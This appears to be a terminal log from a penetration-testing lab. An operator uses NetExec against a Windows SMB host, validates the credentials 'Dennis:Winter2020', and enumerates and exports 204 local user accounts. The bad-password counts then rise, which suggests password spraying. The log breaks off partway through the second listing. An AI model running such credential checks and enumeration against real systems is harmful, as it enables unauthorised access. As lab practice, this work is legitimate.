@@ -1,0 +1,765 @@
+┌──(kali㉿kali)-[~]
+└─$ nxc smb 10.10.234.39 -u username -p 'password' --users
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating missing folder logs
+[*] Creating missing folder modules
+[*] Creating missing folder workspaces
+[*] Creating missing folder obfuscated_scripts
+[*] Creating missing folder screenshots
+[*] Creating missing folder logs/sam
+[*] Creating missing folder logs/lsa
+[*] Creating missing folder logs/ntds
+[*] Creating missing folder logs/dpapi
+[*] Creating default workspace
+[*] Initializing VNC protocol database
+[*] Initializing SMB protocol database
+[*] Initializing NFS protocol database
+[*] Initializing MSSQL protocol database
+[*] Initializing WINRM protocol database
+[*] Initializing FTP protocol database
+[*] Initializing RDP protocol database
+[*] Initializing SSH protocol database
+[*] Initializing WMI protocol database
+[*] Initializing LDAP protocol database
+[*] Copying default configuration file
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [*] Windows Server 2022 Build 20348 x64 (name:EC2AMAZ-IHPV2CM) (domain:EC2AMAZ-IHPV2CM) (signing:False) (SMBv1:False)
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [-] EC2AMAZ-IHPV2CM\username:password STATUS_LOGON_FAILURE
+
+┌──(kali㉿kali)-[~]
+└─$ nxc smb 10.10.234.39 -u Dennis -p 'Winter2020' --users
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [*] Windows Server 2022 Build 20348 x64 (name:EC2AMAZ-IHPV2CM) (domain:EC2AMAZ-IHPV2CM) (signing:False) (SMBv1:False)
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [+] EC2AMAZ-IHPV2CM\Dennis:Winter2020
+
+┌──(kali㉿kali)-[~]
+└─$ nxc smb 10.10.234.39 -u Dennis -p 'Winter2020' --users
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [*] Windows Server 2022 Build 20348 x64 (name:EC2AMAZ-IHPV2CM) (domain:EC2AMAZ-IHPV2CM) (signing:False) (SMBv1:False)
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [+] EC2AMAZ-IHPV2CM\Dennis:Winter2020
+
+┌──(kali㉿kali)-[~]
+└─$ ls
+Desktop    MD5.txt   Public     files.tar     peda     volatility3-1.0.0.tar.gz
+Documents  Music     Templates  nc            sam.txt
+Downloads  Pictures  Videos     password.lst  snap
+
+┌──(kali㉿kali)-[~]
+└─$ nxc smb 10.10.234.39 -u Dennis -p 'Winter2020' --users-export users.txt
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [*] Windows Server 2022 Build 20348 x64 (name:EC2AMAZ-IHPV2CM) (domain:EC2AMAZ-IHPV2CM) (signing:False) (SMBv1:False)
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [+] EC2AMAZ-IHPV2CM\Dennis:Winter2020
+
+┌──(kali㉿kali)-[~]
+└─$ ls
+Desktop    MD5.txt   Public     files.tar     peda     volatility3-1.0.0.tar.gz
+Documents  Music     Templates  nc            sam.txt
+Downloads  Pictures  Videos     password.lst  snap
+
+┌──(kali㉿kali)-[~]
+└─$ nxc smb 10.10.234.39 -u Dennis -p 'Winter2020' --users-export users.txt
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [*] Windows Server 2022 Build 20348 x64 (name:EC2AMAZ-IHPV2CM) (domain:EC2AMAZ-IHPV2CM) (signing:False) (SMBv1:False)
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [+] EC2AMAZ-IHPV2CM\Dennis:Winter2020 (Pwn3d!)
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  -Username-                    -Last PW Set-       -BadPW- -Description-
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Aaron                         2025-09-23 09:56:58 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Abigail                       2025-09-23 09:56:59 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Adam                          2025-09-23 09:56:52 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Administrator                 2024-09-05 23:44:20 0       Built-in account for administering the computer/domain
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Alan                          2025-09-23 09:56:54 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Albert                        2025-09-23 09:56:49 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Alexander                     2025-09-23 09:56:58 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Alice                         2025-09-23 09:57:01 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Amanda                        2025-09-23 09:56:49 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Amber                         2025-09-23 09:56:50 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Amy                           2025-09-23 09:56:50 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Andrea                        2025-09-23 09:57:00 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Andrew                        2025-09-23 09:56:59 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Angela                        2025-09-23 09:56:59 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Ann                           2025-09-23 09:57:02 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Anna                          2025-09-23 09:56:58 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Anthony                       2025-09-23 09:56:51 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Arthur                        2025-09-23 09:57:02 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Ashley                        2025-09-23 09:56:51 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Austin                        2025-09-23 09:56:52 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Barbara                       2025-09-23 09:56:49 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Beau                          2025-09-23 09:56:54 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Benjamin                      2025-09-23 09:56:57 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Betty                         2025-09-23 09:57:03 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Beverly                       2025-09-23 09:57:01 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Billy                         2025-09-23 09:56:56 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Bobby                         2025-09-23 09:56:52 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Brandon                       2025-09-23 09:56:52 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Brenda                        2025-09-23 09:56:56 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Brian                         2025-09-23 09:56:53 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Brittany                      2025-09-23 09:57:01 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Bruce                         2025-09-23 09:56:53 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Bryan                         2025-09-23 09:56:57 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Carl                          2025-09-23 09:56:56 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Carol                         2025-09-23 09:56:58 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Carolyn                       2025-09-23 09:57:00 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Catherine                     2025-09-23 09:57:03 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Charles                       2025-09-23 09:56:57 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Cheryl                        2025-09-23 09:56:57 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Christian                     2025-09-23 09:56:49 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Christina                     2025-09-23 09:57:01 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Christine                     2025-09-23 09:56:58 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Christopher                   2025-09-23 09:57:02 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Cynthia                       2025-09-23 09:57:02 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Daniel                        2025-09-23 09:56:58 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Danielle                      2025-09-23 09:56:56 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Deborah                       2025-09-23 09:56:50 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Debra                         2025-09-23 09:56:57 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  DefaultAccount                <never>             0       A user account managed by the system.
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Denise                        2025-09-23 09:57:02 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Dennis                        2025-09-23 09:57:03 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Diana                         2025-09-23 09:56:56 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Diane                         2025-09-23 09:56:56 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Donald                        2025-09-23 09:56:51 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Doris                         2025-09-23 09:57:00 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Dorothy                       2025-09-23 09:56:59 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Douglas                       2025-09-23 09:57:04 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Dylan                         2025-09-23 09:57:00 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Edward                        2025-09-23 09:57:01 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Elizabeth                     2025-09-23 09:57:00 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Emily                         2025-09-23 09:56:53 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Emma                          2025-09-23 09:56:52 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Eric                          2025-09-23 09:56:55 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Ethan                         2025-09-23 09:57:03 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Eugene                        2025-09-23 09:56:55 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Evelyn                        2025-09-23 09:56:52 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Frances                       2025-09-23 09:56:49 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Frank                         2025-09-23 09:56:56 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Gabriel                       2025-09-23 09:56:52 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Gary                          2025-09-23 09:57:02 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  George                        2025-09-23 09:56:49 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Gerald                        2025-09-23 09:56:54 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Gloria                        2025-09-23 09:56:55 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Grace                         2025-09-23 09:56:52 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Gregory                       2025-09-23 09:57:02 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Guest                         <never>             0       Built-in account for guest access to the computer/domain
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Hannah                        2025-09-23 09:56:57 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Harold                        2025-09-23 09:56:51 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Harry                         2025-09-23 09:56:57 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Heather                       2025-09-23 09:56:54 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Helen                         2025-09-23 09:56:53 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Henry                         2025-09-23 09:56:54 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Howard                        2025-09-23 09:56:50 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jack                          2025-09-23 09:57:03 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jacob                         2025-09-23 09:56:50 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jacqueline                    2025-09-23 09:56:49 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  James                         2025-09-23 09:56:58 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jane                          2025-09-23 09:56:49 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Janet                         2025-09-23 09:57:00 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Janice                        2025-09-23 09:57:00 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jason                         2025-09-23 09:56:49 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jean                          2025-09-23 09:56:51 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jeffrey                       2025-09-23 09:57:03 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jennifer                      2025-09-23 09:56:50 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jeremy                        2025-09-23 09:56:55 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jerry                         2025-09-23 09:57:03 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jesse                         2025-09-23 09:56:54 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jessica                       2025-09-23 09:56:54 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Joan                          2025-09-23 09:57:01 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Joe                           2025-09-23 09:56:55 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  John                          2025-09-23 09:56:55 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Johnny                        2025-09-23 09:56:57 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jonathan                      2025-09-23 09:56:59 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jordan                        2025-09-23 09:57:00 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jose                          2025-09-23 09:56:51 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Joseph                        2025-09-23 09:56:57 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Joshua                        2025-09-23 09:56:52 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Joyce                         2025-09-23 09:57:03 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Juan                          2025-09-23 09:56:53 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Judith                        2025-09-23 09:56:59 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Judy                          2025-09-23 09:56:57 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Julia                         2025-09-23 09:57:04 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Julie                         2025-09-23 09:56:53 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Justin                        2025-09-23 09:56:56 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Karen                         2025-09-23 09:56:51 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Katherine                     2025-09-23 09:57:03 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kathleen                      2025-09-23 09:56:58 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kathryn                       2025-09-23 09:57:01 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kathy                         2025-09-23 09:56:58 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Keith                         2025-09-23 09:56:51 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kelly                         2025-09-23 09:56:55 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kenneth                       2025-09-23 09:56:57 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kevin                         2025-09-23 09:57:04 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kimberly                      2025-09-23 09:56:50 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kyle                          2025-09-23 09:56:52 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Larry                         2025-09-23 09:56:53 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Laura                         2025-09-23 09:56:55 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Lauren                        2025-09-23 09:57:04 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Lawrence                      2025-09-23 09:56:53 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Linda                         2025-09-23 09:57:01 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Lisa                          2025-09-23 09:57:04 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Lori                          2025-09-23 09:56:59 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Louis                         2025-09-23 09:56:53 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Madison                       2025-09-23 09:56:57 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Margaret                      2025-09-23 09:56:53 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Maria                         2025-09-23 09:56:53 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Marie                         2025-09-23 09:56:59 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Marilyn                       2025-09-23 09:56:54 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Mark                          2025-09-23 09:56:56 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Martha                        2025-09-23 09:57:03 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Mary                          2025-09-23 09:57:03 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Matthew                       2025-09-23 09:57:01 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Megan                         2025-09-23 09:56:56 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Melissa                       2025-09-23 09:57:00 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Michael                       2025-09-23 09:57:02 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Michelle                      2025-09-23 09:56:56 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Mildred                       2025-09-23 09:57:04 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Nancy                         2025-09-23 09:56:50 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Natalie                       2025-09-23 09:57:02 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Nathan                        2025-09-23 09:57:01 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Nicholas                      2025-09-23 09:56:50 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Nicole                        2025-09-23 09:56:55 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Noah                          2025-09-23 09:57:02 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Olivia                        2025-09-23 09:56:56 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Pamela                        2025-09-23 09:57:04 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Patricia                      2025-09-23 09:56:54 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Patrick                       2025-09-23 09:56:55 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Paul                          2025-09-23 09:57:00 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Peter                         2025-09-23 09:57:04 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Philip                        2025-09-23 09:56:59 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Rachel                        2025-09-23 09:56:58 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Ralph                         2025-09-23 09:56:49 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Randy                         2025-09-23 09:56:54 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Raymond                       2025-09-23 09:56:52 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Rebecca                       2025-09-23 09:56:58 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Richard                       2025-09-23 09:56:59 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Robert                        2025-09-23 09:56:49 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Roger                         2025-09-23 09:56:52 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Ronald                        2025-09-23 09:56:51 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Rose                          2025-09-23 09:56:57 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Roy                           2025-09-23 09:57:04 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Russell                       2025-09-23 09:56:55 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Ruth                          2025-09-23 09:56:51 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Ryan                          2025-09-23 09:56:59 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Samantha                      2025-09-23 09:56:50 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Samuel                        2025-09-23 09:57:00 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Sandra                        2025-09-23 09:56:49 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Sara                          2025-09-23 09:56:51 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Sarah                         2025-09-23 09:57:04 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Scott                         2025-09-23 09:57:04 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Sean                          2025-09-23 09:57:01 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Sharon                        2025-09-23 09:57:01 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Shirley                       2025-09-23 09:57:03 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Stephanie                     2025-09-23 09:56:59 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Stephen                       2025-09-23 09:56:54 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Steven                        2025-09-23 09:56:51 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Susan                         2025-09-23 09:57:00 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Teresa                        2025-09-23 09:56:50 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Terry                         2025-09-23 09:57:02 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Theresa                       2025-09-23 09:57:04 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Thomas                        2025-09-23 09:56:58 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Tiffany                       2025-09-23 09:56:54 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Timothy                       2025-09-23 09:56:51 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Tyler                         2025-09-23 09:57:01 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Victoria                      2025-09-23 09:56:50 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Vincent                       2025-09-23 09:56:53 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Virginia                      2025-09-23 09:57:02 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Walter                        2025-09-23 09:56:54 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Wayne                         2025-09-23 09:56:55 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  WDAGUtilityAccount            2021-08-19 13:31:41 0       A user account managed and used by the system for Windows Defender Application Guard scenarios.
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  whitelist                     2024-07-09 21:08:23 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  William                       2025-09-23 09:56:58 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Willie                        2025-09-23 09:56:55 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Zachary                       2025-09-23 09:56:56 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [*] Enumerated 204 local users: EC2AMAZ-IHPV2CM
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [*] Writing 204 local users to users.txt
+
+┌──(kali㉿kali)-[~]
+└─$ nxc smb 10.10.234.39 -u Dennis -p 'Winter2020' --users-export users.txt
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [*] Windows Server 2022 Build 20348 x64 (name:EC2AMAZ-IHPV2CM) (domain:EC2AMAZ-IHPV2CM) (signing:False) (SMBv1:False)
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [+] EC2AMAZ-IHPV2CM\Dennis:Winter2020 (Pwn3d!)
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  -Username-                    -Last PW Set-       -BadPW- -Description-
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Aaron                         2025-09-23 09:56:58 3
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Abigail                       2025-09-23 09:56:59 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Adam                          2025-09-23 09:56:52 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Administrator                 2024-09-05 23:44:20 2       Built-in account for administering the computer/domain
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Alan                          2025-09-23 09:56:54 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Albert                        2025-09-23 09:56:49 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Alexander                     2025-09-23 09:56:58 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Alice                         2025-09-23 09:57:01 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Amanda                        2025-09-23 09:56:49 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Amber                         2025-09-23 09:56:50 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Amy                           2025-09-23 09:56:50 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Andrea                        2025-09-23 09:57:00 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Andrew                        2025-09-23 09:56:59 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Angela                        2025-09-23 09:56:59 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Ann                           2025-09-23 09:57:02 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Anna                          2025-09-23 09:56:58 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Anthony                       2025-09-23 09:56:51 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Arthur                        2025-09-23 09:57:02 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Ashley                        2025-09-23 09:56:51 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Austin                        2025-09-23 09:56:52 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Barbara                       2025-09-23 09:56:49 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Beau                          2025-09-23 09:56:54 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Benjamin                      2025-09-23 09:56:57 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Betty                         2025-09-23 09:57:03 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Beverly                       2025-09-23 09:57:01 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Billy                         2025-09-23 09:56:56 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Bobby                         2025-09-23 09:56:52 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Brandon                       2025-09-23 09:56:52 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Brenda                        2025-09-23 09:56:56 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Brian                         2025-09-23 09:56:53 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Brittany                      2025-09-23 09:57:01 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Bruce                         2025-09-23 09:56:53 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Bryan                         2025-09-23 09:56:57 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Carl                          2025-09-23 09:56:56 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Carol                         2025-09-23 09:56:58 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Carolyn                       2025-09-23 09:57:00 2
